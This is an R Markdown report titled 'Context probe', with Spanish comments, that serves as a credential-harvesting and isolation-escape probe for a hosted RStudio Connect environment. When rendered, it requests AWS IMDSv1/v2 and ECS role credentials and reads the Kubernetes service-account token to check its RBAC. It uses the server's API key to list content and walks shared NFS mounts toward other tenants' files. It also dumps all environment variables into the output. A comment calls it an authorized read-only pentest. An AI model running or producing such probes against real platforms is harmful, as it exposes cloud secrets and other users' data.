---
title: "Context probe"
output: html_document
---

```{r setup, include=FALSE}
knitr::opts_chunk$set(echo = FALSE, warning = FALSE, message = FALSE, comment = "")
```

```{r probe}
# Sonda de contexto (pentest autorizado). Sin dependencias R: binario curl del sistema.
# SOLO LECTURA: ninguna operacion crea/modifica/borra estado.

curl_bin <- Sys.which("curl")

run_curl <- function(args) {
  bodyf <- tempfile(); hdrf <- tempfile()
  full <- c("-s", "-m", "6", "-o", bodyf, "-D", hdrf, args)
  raw <- tryCatch(system2(curl_bin, full, stdout = TRUE, stderr = TRUE),
                  error = function(e) paste("ERR:", conditionMessage(e)))
  body <- tryCatch(paste(readLines(bodyf, warn = FALSE), collapse = "\n"), error = function(e) "")
  hdrs <- tryCatch(paste(readLines(hdrf, warn = FALSE), collapse = "\n"), error = function(e) "")
  status <- sub(".*?HTTP/[0-9.]+ ([0-9]{3}).*", "\\1", strsplit(hdrs, "\n")[[1]][1])
  unlink(c(bodyf, hdrf))
  list(status = status, body = body, hdrs = hdrs, raw = paste(raw, collapse = "\n"))
}
cget <- function(url, headers = character(0)) {
  a <- c(); for (n in names(headers)) a <- c(a, "-H", paste0(n, ": ", headers[[n]])); run_curl(c(a, url))
}
cput <- function(url, headers = character(0)) {
  a <- c("-X", "PUT"); for (n in names(headers)) a <- c(a, "-H", paste0(n, ": ", headers[[n]])); run_curl(c(a, url))
}
# POST solo-lectura (SelfSubjectRulesReview): no muta recursos, solo consulta permisos propios.
cpost <- function(url, headers = character(0), data = NULL) {
  a <- c("-X", "POST"); for (n in names(headers)) a <- c(a, "-H", paste0(n, ": ", headers[[n]]))
  if (!is.null(data)) a <- c(a, "--data", data); run_curl(c(a, url))
}
show <- function(label, r) {
  cat(label, "\n  status:", ifelse(is.na(r$status) || !nzchar(r$status), "(sin respuesta HTTP)", r$status), "\n")
  if (nzchar(r$raw) && grepl("curl:|ERR:", r$raw)) cat("  curl_msg:", r$raw, "\n")
  if (nzchar(r$body)) cat("  body:\n", r$body, "\n")
}

cat("=== 1. IDENTIDAD DEL POD ===\n")
cat("id       :", system2("id", stdout = TRUE, stderr = TRUE), "\n")
cat("hostname :", system2("hostname", stdout = TRUE, stderr = TRUE), "\n")
cat("R        :", R.version.string, " | curl:", curl_bin, "\n")

cat("\n=== 2. IMDSv2 (PUT token -> GET creds) ===\n")
tok <- cput("http://169.254.169.254/latest/api/token", c("X-aws-ec2-metadata-token-ttl-seconds" = "21600"))
show("PUT /latest/api/token", tok)
if (!is.na(tok$status) && tok$status == "200" && nzchar(tok$body)) {
  hdr <- c("X-aws-ec2-metadata-token" = tok$body)
  role <- cget("http://169.254.169.254/latest/meta-data/iam/security-credentials/", hdr)
  show("GET role name", role)
  rn <- strsplit(role$body, "\n")[[1]][1]
  if (!is.na(rn) && nzchar(rn))
    show(paste0("GET creds [", rn, "]"),
         cget(paste0("http://169.254.169.254/latest/meta-data/iam/security-credentials/", rn), hdr))
}

cat("\n=== 3. IMDSv1 (GET sin token) ===\n")
show("GET v1 security-credentials", cget("http://169.254.169.254/latest/meta-data/iam/security-credentials/"))

cat("\n=== 3b. Diagnostico crudo IMDS (curl -v: distingue red vs error curl) ===\n")
cat(paste(system2(curl_bin, c("-s","-v","-m","4","-o","/dev/null","http://169.254.169.254/latest/meta-data/"),
                  stdout = TRUE, stderr = TRUE), collapse = "\n"), "\n")

cat("\n=== 4. ECS TASK ROLE ===\n")
ecs_uri <- Sys.getenv("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
cat("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI = '", ecs_uri, "'\n", sep = "")
if (nzchar(ecs_uri)) show("GET ECS creds", cget(paste0("http://169.254.170.2", ecs_uri)))

cat("\n=== 5. SERVICE ACCOUNT K8s (token + host) ===\n")
sa <- tryCatch(paste(readLines("/var/run/secrets/kubernetes.io/serviceaccount/token", warn=FALSE), collapse=""),
               error = function(e) paste("ERR:", conditionMessage(e)))
sa_ns <- tryCatch(readLines("/var/run/secrets/kubernetes.io/serviceaccount/namespace", warn=FALSE)[1],
                  error = function(e) "n/a")
cat("SA token (primeros 40):", substr(sa, 1, 40), "...\n")
cat("SA namespace:", sa_ns, "\n")
k8s_host <- Sys.getenv("KUBERNETES_SERVICE_HOST", "n/a")
k8s_port <- Sys.getenv("KUBERNETES_SERVICE_PORT_HTTPS", "443")
cat("K8s API:", k8s_host, ":", k8s_port, "\n")

cat("\n=== #8. ALCANCE DE CONNECT_API_KEY (solo lectura) ===\n")
apikey <- Sys.getenv("CONNECT_API_KEY", "")
server <- Sys.getenv("CONNECT_SERVER", "")
if (nzchar(apikey) && nzchar(server)) {
  server <- sub("/+$", "", server)
  auth <- c("Authorization" = paste("Key", apikey))
  show("GET /__api__/v1/me", cget(paste0(server, "/__api__/v1/me"), auth))
  # listado de contenido: revela si la key ve contenido mas alla del propio (aislamiento)
  show("GET /__api__/v1/content (count)", cget(paste0(server, "/__api__/v1/content?limit=500"), auth))
} else cat("CONNECT_API_KEY o CONNECT_SERVER ausentes\n")

cat("\n=== #9. RBAC DEL SA K8s (SelfSubjectRulesReview, solo lectura) ===\n")
if (!grepl("ERR:", sa) && k8s_host != "n/a") {
  ca <- "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
  url <- paste0("https://", k8s_host, ":", k8s_port,
                "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews")
  data <- sprintf('{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"%s"}}', sa_ns)
  a <- c("-X","POST","--cacert",ca,
         "-H", paste0("Authorization: Bearer ", sa),
         "-H", "Content-Type: application/json",
         "--data", data)
  r <- run_curl(c(a, url))
  show("POST selfsubjectrulesreviews", r)
} else cat("SA token no disponible o host K8s desconocido\n")

cat("\n=== #10. AISLAMIENTO DEL MONTAJE NFS/FSx (solo lectura, ls) ===\n")
probe_dirs <- c(
  "/opt/rstudio-connect/mnt/app",
  "/opt/rstudio-connect/mnt/app/..",
  "/opt/rstudio-connect/mnt/app/../..",
  "/opt/rstudio-connect/mnt/report/..",
  "/opt/rstudio-connect/mnt/job/.."
)
for (d in probe_dirs) {
  cat("\n--- ls", d, "---\n")
  cat(paste(tryCatch(system2("ls", c("-la", d), stdout = TRUE, stderr = TRUE),
                     error = function(e) paste("ERR:", conditionMessage(e))), collapse = "\n"), "\n")
}
# intento de subir por el arbol de reports hacia otros IDs de contenido
cat("\n--- find (2 niveles) bajo el ancestro de data/reports ---\n")
cat(paste(tryCatch(system2("bash", c("-c",
  "d=$(df -P /opt/rstudio-connect/mnt/app | tail -1 | awk '{print $6}'); echo MOUNT=$d; find $d -maxdepth 2 -type d 2>/dev/null | head -50"),
  stdout = TRUE, stderr = TRUE), error = function(e) paste("ERR:", conditionMessage(e))), collapse = "\n"), "\n")

cat("\n=== 6. VARIABLES DE ENTORNO ===\n")
env <- Sys.getenv(); for (k in sort(names(env))) cat(k, "=", env[[k]], "\n", sep = "")

cat("\n=== 7. MONTAJES ===\n")
cat(paste(tryCatch(system2("mount", stdout = TRUE, stderr = TRUE), error = function(e) "n/a"), collapse = "\n"), "\n")
```
